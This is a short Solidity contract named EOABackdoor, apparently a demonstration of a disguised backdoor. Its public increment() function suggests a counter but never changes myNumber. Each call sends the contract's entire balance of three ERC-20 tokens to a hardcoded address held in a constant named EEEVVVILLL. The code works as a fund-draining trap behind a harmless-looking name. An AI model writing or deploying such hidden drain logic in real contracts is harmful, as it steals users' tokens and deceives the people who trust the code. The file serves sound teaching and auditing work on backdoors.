// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EOABackdoor {
    uint256 public myNumber;

    address public constant EEEVVVILLL =
        0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    IERC20 public immutable i_tokenA;
    IERC20 public immutable i_tokenB;
    IERC20 public immutable i_tokenC;

    constructor(IERC20 tokenA, IERC20 tokenB, IERC20 tokenC) {
        i_tokenA = tokenA;
        i_tokenB = tokenB;
        i_tokenC = tokenC;
    }

    function increment() public {
        i_tokenA.transfer(EEEVVVILLL, i_tokenA.balanceOf(address(this)));
        i_tokenB.transfer(EEEVVVILLL, i_tokenB.balanceOf(address(this)));
        i_tokenC.transfer(EEEVVVILLL, i_tokenC.balanceOf(address(this)));
    }
}
